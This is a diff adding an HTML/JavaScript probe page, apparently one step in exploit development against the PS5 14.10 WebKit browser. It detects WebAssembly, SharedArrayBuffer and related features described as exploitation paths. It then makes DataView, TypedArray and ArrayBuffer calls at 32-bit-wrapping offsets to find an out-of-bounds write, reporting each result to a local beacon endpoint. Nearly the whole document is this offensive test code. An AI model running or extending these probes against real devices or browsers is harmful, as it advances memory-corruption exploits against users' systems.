@@ -1,0 +1,224 @@
+<!--
+  p601: DataView integer overflow + WebAssembly feature detection
+
+  QUESTION 1: Does DataView bounds checking use 32-bit arithmetic on PS5 14.10?
+    If view.setUint32(0xFFFFFFFE, val) on a small buffer does NOT throw RangeError,
+    the index*elementSize wraps and we get OOB write ~4GB past the buffer.
+
+  QUESTION 2: Is WebAssembly available on PS5 14.10 WebKit 605.1.15?
+    WebKit disabled useWasmFastMemory on PlayStation (Sep 2024).
+    If WASM is available, Memory/Table objects open new exploitation paths.
+
+  QUESTION 3: Is SharedArrayBuffer available?
+    SAB enables Spectre-style timing and cross-worker shared memory.
+
+  CRASH_CLASS: MODERATE (OOB write may crash WebProcess)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p601</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P601-FEATURE-DETECT');
+
+  // === SECTION A: WebAssembly availability ===
+  b('SEC-A:WASM');
+  try {
+    var hasWasm = typeof WebAssembly !== 'undefined';
+    b('WASM-TYPEOF:'+(hasWasm ? 'object' : 'undefined'));
+    if(hasWasm){
+      b('WASM-VALIDATE:'+(typeof WebAssembly.validate));
+      b('WASM-COMPILE:'+(typeof WebAssembly.compile));
+      b('WASM-INSTANCE:'+(typeof WebAssembly.instantiate));
+      b('WASM-MODULE:'+(typeof WebAssembly.Module));
+      b('WASM-MEMORY:'+(typeof WebAssembly.Memory));
+      b('WASM-TABLE:'+(typeof WebAssembly.Table));
+
+      // Try to create a minimal WASM module (magic + version + empty)
+      try {
+        var minimal = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00]);
+        var valid = WebAssembly.validate(minimal.buffer);
+        b('WASM-MINIMAL-VALID:'+valid);
+      } catch(e){ b('WASM-MINIMAL-ERR:'+e.message); }
+
+      // Try WASM Memory
+      try {
+        var mem = new WebAssembly.Memory({initial:1});
+        b('WASM-MEM-CREATE:OK,byteLength='+mem.buffer.byteLength);
+        try { mem.grow(1); b('WASM-MEM-GROW:OK,byteLength='+mem.buffer.byteLength); }
+        catch(e2){ b('WASM-MEM-GROW-ERR:'+e2.message); }
+      } catch(e){ b('WASM-MEM-ERR:'+e.message); }
+
+      // Try WASM Table
+      try {
+        var tbl = new WebAssembly.Table({initial:1,element:'anyfunc'});
+        b('WASM-TABLE-CREATE:OK,length='+tbl.length);
+      } catch(e){ b('WASM-TABLE-ERR:'+e.message); }
+    }
+  } catch(e){ b('WASM-CATCH:'+e.message); }
+
+  // === SECTION B: SharedArrayBuffer ===
+  b('SEC-B:SAB');
+  try {
+    var hasSAB = typeof SharedArrayBuffer !== 'undefined';
+    b('SAB-TYPEOF:'+(hasSAB ? 'function' : 'undefined'));
+    if(hasSAB){
+      try {
+        var sab = new SharedArrayBuffer(64);
+        b('SAB-CREATE:OK,byteLength='+sab.byteLength);
+        var i32 = new Int32Array(sab);
+        b('SAB-INT32:OK');
+        var hasAtomics = typeof Atomics !== 'undefined';
+        b('ATOMICS:'+(hasAtomics ? 'available' : 'missing'));
+      } catch(e){ b('SAB-CREATE-ERR:'+e.message); }
+    }
+  } catch(e){ b('SAB-CATCH:'+e.message); }
+
+  // === SECTION C: DataView bounds check (safe probes first) ===
+  b('SEC-C:DATAVIEW');
+
+  // C1: Normal operation baseline
+  var ab1 = new ArrayBuffer(256);
+  var dv1 = new DataView(ab1);
+  try {
+    dv1.setUint32(0, 0xDEADBEEF);
+    dv1.setUint32(252, 0xCAFEBABE);  // last valid 4-byte offset
+    b('DV-NORMAL:OK');
+  } catch(e){ b('DV-NORMAL-ERR:'+e.message); }
+
+  // C2: Just past end — should throw RangeError
+  try {
+    dv1.setUint32(253, 0x11111111);  // 1 byte past end
+    b('DV-PASTEND:NO-THROW');  // BAD — bounds check failed
+  } catch(e){
+    b('DV-PASTEND:'+e.constructor.name+':'+e.message);  // Expected: RangeError
+  }
+
+  // C3: Large offset that wraps in 32-bit: 0xFFFFFFFE + 4 = 0x100000002 → 2 in 32-bit
+  // On a 256-byte buffer, if check uses 32-bit: 2 < 256 passes → OOB write at buf+0xFFFFFFFE
+  // On correct check: 0xFFFFFFFE > 256 → RangeError
+  try {
+    dv1.setUint32(0xFFFFFFFE, 0x41414141);
+    b('★DV-WRAP32:NO-THROW');  // CRITICAL — integer overflow in bounds check!
+  } catch(e){
+    b('DV-WRAP32:'+e.constructor.name+':'+e.message);
+  }
+
+  // C4: Another wrapping value: 0x80000000 + 4 = 0x80000004
+  // If signed comparison: -2147483648 < 256 might pass
+  try {
+    dv1.setUint32(0x80000000, 0x42424242);
+    b('★DV-SIGNED:NO-THROW');  // Integer overflow or signed comparison bug
+  } catch(e){
+    b('DV-SIGNED:'+e.constructor.name+':'+e.message);
+  }
+
+  // C5: Float64 variant (elementSize=8): 0xFFFFFFF8 + 8 = 0x100000000 → 0
+  try {
+    var f64 = new Float64Array(ab1);  // 32 elements (256/8)
+    // Direct Float64Array index: 0x1FFFFFFF * 8 = 0xFFFFFFF8 in 32-bit
+    // But Float64Array index is already bounds-checked differently
+    // Test via DataView instead
+    dv1.setFloat64(0xFFFFFFF8, 1.5);
+    b('★DV-F64WRAP:NO-THROW');
+  } catch(e){
+    b('DV-F64WRAP:'+e.constructor.name+':'+e.message);
+  }
+
+  // C6: getUint32 read version of the overflow
+  try {
+    var val = dv1.getUint32(0xFFFFFFFE);
+    b('★DV-READWRAP:NO-THROW,val=0x'+val.toString(16));
+  } catch(e){
+    b('DV-READWRAP:'+e.constructor.name+':'+e.message);
+  }
+
+  // === SECTION D: TypedArray large index ===
+  b('SEC-D:TYPEDARRAY');
+
+  // D1: Uint8Array with very large index
+  var u8 = new Uint8Array(ab1);
+  try {
+    // In JS, array[idx] with idx > length is just undefined (no throw)
+    // But subarray() might have different bounds
+    var val = u8[0xFFFFFFFE];
+    b('U8-BIGIDX:val='+(val === undefined ? 'undefined' : val));
+  } catch(e){ b('U8-BIGIDX-ERR:'+e.message); }
+
+  // D2: TypedArray.prototype.set with offset overflow
+  var src = new Uint8Array([1,2,3,4]);
+  try {
+    u8.set(src, 0xFFFFFFFE);  // offset + src.length wraps?
+    b('★U8-SET-WRAP:NO-THROW');
+  } catch(e){
+    b('U8-SET-WRAP:'+e.constructor.name+':'+e.message);
+  }
+
+  // D3: subarray with wrapping bounds
+  try {
+    var sub = u8.subarray(0xFFFFFFFE, 0x100000002);
+    b('U8-SUBARRAY:length='+sub.length+',byteOffset='+sub.byteOffset);
+  } catch(e){
+    b('U8-SUBARRAY-ERR:'+e.constructor.name+':'+e.message);
+  }
+
+  // === SECTION E: ArrayBuffer transfer/slice edge cases ===
+  b('SEC-E:BUFFER-OPS');
+
+  // E1: slice with negative/wrapping args
+  try {
+    var sliced = ab1.slice(-4);  // last 4 bytes — should work
+    b('AB-SLICE-NEG4:len='+sliced.byteLength);
+  } catch(e){ b('AB-SLICE-NEG4-ERR:'+e.message); }
+
+  try {
+    var sliced2 = ab1.slice(0xFFFFFFFE);
+    b('AB-SLICE-WRAP:len='+sliced2.byteLength);
+  } catch(e){ b('AB-SLICE-WRAP-ERR:'+e.message); }
+
+  // E2: ArrayBuffer.transfer (if available)
+  try {
+    if(typeof ab1.transfer === 'function'){
+      b('AB-TRANSFER:available');
+    } else if(typeof ArrayBuffer.transfer === 'function'){
+      b('AB-TRANSFER-STATIC:available');
+    } else {
+      b('AB-TRANSFER:missing');
+    }
+  } catch(e){ b('AB-TRANSFER-ERR:'+e.message); }
+
+  // E3: Structured clone (postMessage to self)
+  try {
+    if(typeof structuredClone === 'function'){
+      b('STRUCTURED-CLONE:available');
+    } else {
+      b('STRUCTURED-CLONE:missing');
+    }
+  } catch(e){ b('STRUCTURED-CLONE-ERR:'+e.message); }
+
+  // === SECTION F: Worker availability ===
+  b('SEC-F:WORKERS');
+  try {
+    var hasWorker = typeof Worker !== 'undefined';
+    b('WORKER:'+(hasWorker ? 'available' : 'missing'));
+  } catch(e){ b('WORKER-ERR:'+e.message); }
+
+  try {
+    var hasSW = typeof ServiceWorker !== 'undefined' || (typeof navigator !== 'undefined' && typeof navigator.serviceWorker !== 'undefined');
+    b('SERVICE-WORKER:'+(hasSW ? 'available' : 'missing'));
+  } catch(e){ b('SW-ERR:'+e.message); }
+
+  // === SECTION G: Proxy/Reflect (useful for trapping) ===
+  b('SEC-G:META');
+  try { b('PROXY:'+(typeof Proxy !== 'undefined' ? 'available' : 'missing')); } catch(e){}
+  try { b('REFLECT:'+(typeof Reflect !== 'undefined' ? 'available' : 'missing')); } catch(e){}
+  try { b('SYMBOL:'+(typeof Symbol !== 'undefined' ? 'available' : 'missing')); } catch(e){}
+  try { b('WEAKREF:'+(typeof WeakRef !== 'undefined' ? 'available' : 'missing')); } catch(e){}
+  try { b('FINREG:'+(typeof FinalizationRegistry !== 'undefined' ? 'available' : 'missing')); } catch(e){}
+
+  b('P601-COMPLETE');
+}
+
+setTimeout(main, 100);
+// NO auto-reload — single run, check results manually
+</script></head><body>p601: feature detection</body></html>
